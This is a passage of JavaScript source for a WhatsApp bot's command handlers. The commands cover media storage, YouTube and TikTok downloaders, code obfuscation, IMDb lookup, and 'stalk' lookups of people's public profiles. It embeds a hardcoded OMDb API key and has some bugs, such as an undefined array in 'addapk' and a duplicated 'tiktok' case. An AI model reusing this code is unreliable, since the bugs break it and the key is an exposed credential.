break
case 'delvideo':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Enter the video name')
if (!VideoXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
replygcxeon(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
replygcxeon(teks)
}
break
case 'addimage':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Whats the image name?')
if (ImageXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Enter the image name')
if (!ImageXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
replygcxeon(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
replygcxeon(teks)
}
break
case 'addsticker':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Whats the sticker name?')
if (StickerXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Enter the sticker name')
if (!StickerXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
replygcxeon(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
replygcxeon(teks)
}
break
case 'addmsg': {
	if (!YasamCreator) return replygcxeon (mess.owner)
 if (!m.quoted) return replygcxeon('Reply Message You Want To Save In Database')
 if (!text) return replygcxeon(`Example : ${prefix + command} filename`)
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) return replygcxeon(`'${text}' registered in the message list`)
 msgs[text.toLowerCase()] = quoted.fakeObj
replygcxeon(`Successfully added message in message list as '${text}'
 
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
 }
 break
 case 'getmsg': {
 if (!text) return replygcxeon(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
 Yasam.copyNForward(m.chat, msgs[text.toLowerCase()], true)
 }
 break
 case 'listmsg': {
 let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	 let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		 teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	 }
	 replygcxeon(teks)
	 }
	 break 
	case 'delmsg': case 'deletemsg': {
		if (!YasamCreator) return replygcxeon (mess.owner)
	 let msgs = global.db.data.database
	 if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcxeon(`Successfully deleted '${text}' from the message list`)
 }
	 break
case 'addvn':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
replygcxeon(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
replygcxeon(teks)
}
break
case 'addzip':{
if (!YasamCreator) return replygcxeon (mess.owner)

if (args.length < 1) return replygcxeon(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/zip/${teks}.zip`)
fs.writeFileSync('./XeonMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!YasamCreator) return replygcxeon (mess.owner)

if (args.length < 1) return replygcxeon('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./XeonMedia/zip/${teks}.zip`)
replygcxeon(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcxeon(teksooooo)
}
break
case 'addapk':{
if (!YasamCreator) return replygcxeon (mess.owner)

if (args.length < 1) return replygcxeon('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./XeonMedia/apk/${teks}.apk`)
fs.writeFileSync('./XeonMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!YasamCreator) return replygcxeon (mess.owner)

if (args.length < 1) return replygcxeon('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
replygcxeon(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcxeon(teksoooooo)
}
break

case 'addpdf':{
if (!YasamCreator) return replygcxeon (mess.owner)

if (args.length < 1) return replygcxeon('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
DocXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
fs.writeFileSync('./XeonMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!YasamCreator) return replygcxeon (mess.owner)

if (args.length < 1) return replygcxeon('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = DocXeon.indexOf(teks)
DocXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
replygcxeon(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocXeon) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
replygcxeon(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
Yasam_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Yasam.sendMessage(m.chat, { audio: Yasam_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: fvrif }) 
break
case 'friend':
case 'searchfriend':{
await replygcxeon (mess.wait)
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcxeon('Managed to Get One Person')
}, 5000)
setTimeout(() => {
Yasam.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break

case 'q': case 'quoted': {
if (!m.quoted) return replygcxeon('Reply the Message!!')
let xeonquotx= await Yasam.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replygcxeon('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcxeon(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replygcxeon(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcxeon('Enter Query text!')
 let anu = await styletext(text)
 let teks = `Style Text From ${text}\n\n`
 for (let i of anu) {
 teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
 }
 replygcxeon(teks)
	 }
	 break
case 'yts': case 'ytsearch': {
 if (!text) return replygcxeon(`Example : ${prefix + command} story wa anime`)
 let yts = require("yt-search")
 let search = await yts(text)
 let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
 let no = 1
 for (let i of search.all) {
 teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
 }
 Yasam.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: teks }, { quoted: fvrif })
 }
 break 
case 'ytaudio': 
			case 'ytmp3': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`Contoh: ${prefix + command} https://youtu.be/videoId`);
				if (!text.includes('youtu')) return replygcxeon(`Link yang kakak masukkan bukan link YouTube! 😅`);
				try {
					await emote('⏱️');
					let search = await yts(text);
					if (!search || search.all.length === 0) return replygcxeon(`*Video tidak ditemukan!* ☹️`);
					let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
					let caption = `「 *YOUTUBE AUDIO* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`
					await Yasam.sendMessage(m.chat, {
						image: { url: image }, 
						caption: caption
					}, { 
						quoted: m 
					});
					const response = await fetchJson(`https://api.khaliddesu.my.id/api/savetube?url=${url}&type=audio`);
					if (!response || !response.result) {
						return replygcxeon(`*Audio tidak ditemukan, silahkan ketik ulang command atau coba lagi nanti ya kak! 🙏*`);
					}
					await Yasam.sendMessage(m.chat, { 
						audio: { url: response.result }, 
						mimetype: 'audio/mpeg',
						fileName: `${title}.mp3`,
						ptt: true
					}, { 
						quoted: m 
					});
				} catch (err) {
					console.error(err);
					replygcxeon(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;			
			case 'ytmp4': 
			case 'ytvideo': 
			case 'ytv': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`Contoh: ${prefix + command} https://youtu.be/videoId`);
				if (!text.includes('youtu')) return replygcxeon(`Link yang kakak masukkan bukan link YouTube! 😅`);
				try {
					await emote('⏱️');
					const vidIdMatch = text.match(/(?:youtu\.be\/|youtube\.com\/(?:.*[?&]v=|embed\/|shorts\/|v\/))([\w-]{11})/);
					const vidId = vidIdMatch ? vidIdMatch[1] : null;
					if (!vidId) {
						return replygcxeon(`Gagal mengekstrak ID video dari link! 😓`);
					}
					let search = await yts({ videoId: vidId, hl: 'id', gl: 'ID' });
					if (!search) return replygcxeon(`*Video tidak ditemukan!* ☹️`);
					let { title, url, image } = search;
					let caption = `「 *YOUTUBE VIDEO* 」\n\n💬 Title : ${title}\n🔗 URL Video : ${url}`
					await Yasam.sendMessage(m.chat, {
						image: { url: image }, 
						caption: caption
					}, { quoted: m });
					const response = await fetchJson(`https://api.khaliddesu.my.id/api/savetube?url=${url}&type=video`);
					if (!response || !response.result) {
						return replygcxeon(`*Video tidak ditemukan, silahkan ketik ulang command atau coba lagi nanti ya kak! 🙏*`);
					}
					await Yasam.sendMessage(m.chat, { 
						video: { url: response.result }, 
						caption: '✅ *Video berhasil diunduh!*'
					}, { quoted: m });
				} catch (err) {
					console.error(err);
					replygcxeon(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
 let [, user, repo] = args[0].match(regex1) || []
 repo = repo.replace(/.git$/, '')
 let url = `https://api.github.com/repos/${user}/${repo}/zipball`
 let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
 Yasam.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: fvrif }).catch((err) => replygcxeon(mess.error))
break
case 'tiktoksearch':
			case 'tiktoks':
			case 'ttsearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`⚠️ Eits, kakak lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *${prefix + command} jj epep* biar Mora bisa bantu cari yang kakak mau! 🔍💬`);
				try {
					let search = await tiktokSearchVideo(text);
					let teks = `🎥 *${search.videos[0].title}*\n\n` +
					`🆔 *Video ID* : ${search.videos[0].video_id}\n` +
					`👤 *Username* : ${search.videos[0].author.unique_id}\n` +
					`🏷️ *Nickname* : ${search.videos[0].author.nickname}\n` +
					`⏳ *Duration* : ${search.videos[0].duration} detik\n` +
					`❤️ *VT Like* : ${search.videos[0].digg_count}\n` +
					`💬 *Comment* : ${search.videos[0].comment_count}\n` +
					`🔄 *Share* : ${search.videos[0].share_count}\n\n` +
					`🔗 *Link*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

					let list = '';
					let no = 1;
					for (let i of search.videos) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
						`⏳ Duration: ${i.duration} detik\n` +
						`❤️ Likes: ${i.digg_count}\n` +
						`💬 Comments: ${i.comment_count}\n` +
						`🔄 Shares: ${i.share_count}\n` +
						`🔗 Link: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
					}

					await Yasam.sendMessage(
						m.chat,
						{
							video: { url: `https://tikwm.com${search.videos[0].play}` },
							caption: teks
						},
						{ quoted: m }
					);

					if (search.videos.length > 1) {
						await Yasam.sendMessage(
							m.chat,
							{
								text: `📚 *Daftar Video Lainnya:*\n${list}`
							},
							{ quoted: m }
						);
					}
				} catch (error) {
					console.log(error);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

case "tiktok": case "tt": {
if (!text.includes("tiktok.com")) return m.reply("Masukan link tiktok!")
try {
 let { data } = await axios({
 "method": "GET",
 "url": "https://mannoffc-x.hf.space/download/tiktok",
 "params": {
 "url": text
 }
 })
 let { author, title, duration, medias } = data.result;
 let { url } = medias[0]
 let caption = `*T I K T O K D O W N L O A D E R*\n• Author: ${author}\n• Title: ${title}\n• Duration: ${duration}s`
 Yasam.sendMessage(m.chat, { video: { url }, caption }, { quoted: m })
} catch ({ message }) {
 m.reply(message)
}
}
break
case "facebook": case "fb": {
if (!text.includes("facebook.com")) return m.reply("Masukan link facebook!")
try {
 axios({ "method": "GET", "url": "https://mannoffc-x.hf.space/download/facebook", "params": { "url": text }}).then(_ => {
 Yasam.sendMessage(m.chat, { video: { url: _.data.result.video }, caption: "Ini dia kak" }, { quoted: m })
 })
} catch ({ message }) {
 m.reply(message)
}
}
break
			case 'ttaudio':
			case 'tiktokmp3':
			case 'ttmp3':
			case 'tiktokaudio': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(
					`⚠️ Hmm... kakak belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} https://vt.tiktok.com/ZS8KdFQcQ/* biar Mora bisa bantu! 🎥✨`
				);

				try {
					let anu = await tiktokDownloaderVideo(text); // Menggunakan scraper lokal
					let audio = anu.music_info.url;

					// Kirim informasi audio terlebih dahulu
					await Yasam.sendMessage(
						m.chat,
						{
							text: `🎵 *TikTok Audio*\n\n` +
							`🎼 *Title:* ${anu.music_info.title || '-'}\n` +
							`🎤 *Author:* ${anu.music_info.author || '-'}\n` +
							`💿 *Album:* ${anu.music_info.album || '-'}\n\n` +
							`🔗 *Source:* ${text}`
						},
						{ quoted: m }
					);

					// Kirim audio sebagai file MP3
					await Yasam.sendMessage(
						m.chat,
						{
							audio: { url: audio },
							mimetype: 'audio/mpeg',
							fileName: `${anu.music_info.title || 'audio'}.mp3`
						},
						{ quoted: m }
					);

				} catch (error) {
					console.error(error);
					await replygcxeon(`❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya Kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
case 'ttslide':
			case 'tiktokfoto':
			case 'tiktokmp4':
			case 'tt1':
			case 'ttnowm':
			case 'tiktoknowm':
			case 'tiktok': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(
					`⚠️ Hmm... kakak belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} https://vt.tiktok.com/ZS8KdFQcQ/* biar Mora bisa bantu! 🎥✨`
				);

				try {
					let anu = await tiktokDownloaderVideo(text); // Menggunakan scraper lokal
					let item = 0;

					for (let imgs of anu.data) {
						if (imgs.type == "nowatermark") {
							await Yasam.sendMessage(
								m.chat,
								{
									video: { url: imgs.url },
									caption: `🎥 *Video Info* :\n📍 Region: ${anu.region}\n⏳ Duration: ${anu.duration}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistik Info* :\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info* :\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info* :\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption* :\n${anu.title || 'No Caption'}`
								},
								{ quoted: m }
							);
						}

						if (imgs.type == "photo") {
							if (item == 0) {
								await Yasam.sendMessage(
									m.chat,
									{
										image: { url: imgs.url },
										caption: `🖼️ *Photo Info* :\n📍 Region: ${anu.region}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistik Info* :\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info* :\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info* :\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption* :\n${anu.title || 'No Caption'}${m.isGroup ? anu.data.length > 1 ? "\n📥 _Sisa foto dikirim ke private chat_\n" : "\n" : "\n"}`
									},
									{ quoted: m }
								);
							} else {
								await Yasam.sendMessage(
									m.sender,
									{
										image: { url: imgs.url }
									},
									{ quoted: m }
								);
							}
							item += 1;
							await sleep(2000);
						}
					}
				} catch (err) {
					console.log(err);
					replygcxeon('⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

case 'tiktokstalk': {
	 if (!text) return replygcxeon(`Username? `)
 let res = await fg.ttStalk(args[0])
 let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
 await Yasam.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: fvrif})
}
break
case 'xxxigstalk': {
if (!text) return replygcxeon(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_xeon13`)
 let res = await fg.igStalk(text)
 let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
 await Yasam.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: fvrif})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} DGXeon`)
await replygcxeon (mess.wait)
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
Yasam.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: fvrif } )
}
break
case 'npmstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} xeonapi`)
await replygcxeon (mess.wait)
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcxeon(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break

case 'imdb':
if (!text) return replygcxeon(`_Name a Series or movie`)
await replygcxeon (mess.wait)
 let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
 let imdbt = ""
 console.log(fids.data)
 imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
 imdbt += "🎬Title : " + fids.data.Title + "\n"
 imdbt += "📅Year : " + fids.data.Year + "\n"
 imdbt += "⭐Rated : " + fids.data.Rated + "\n"
 imdbt += "📆Released : " + fids.data.Released + "\n"
 imdbt += "⏳Runtime : " + fids.data.Runtime + "\n"
 imdbt += "🌀Genre : " + fids.data.Genre + "\n"
 imdbt += "👨🏻‍💻Director : " + fids.data.Director + "\n"
 imdbt += "✍Writer : " + fids.data.Writer + "\n"
 imdbt += "👨Actors : " + fids.data.Actors + "\n"
 imdbt += "📃Plot : " + fids.data.Plot + "\n"
 imdbt += "🌐Language : " + fids.data.Language + "\n"
 imdbt += "🌍Country : " + fids.data.Country + "\n"
 imdbt += "🎖️Awards : " + fids.data.Awards + "\n"
 imdbt += "📦BoxOffice : " + fids.data.BoxOffice + "\n"
 imdbt += "🏙️Production : " + fids.data.Production + "\n"
 imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
 imdbt += "✅imdbVotes : " + fids.data.imdbVotes + ""
 Yasam.sendMessage(m.chat, {
 image: {
 url: fids.data.Poster,
 },
 caption: imdbt,
 }, {
 quoted: fvrif,
 })
 break
 case 'ebinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcxeon(eb)
}
break
case 'dbinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
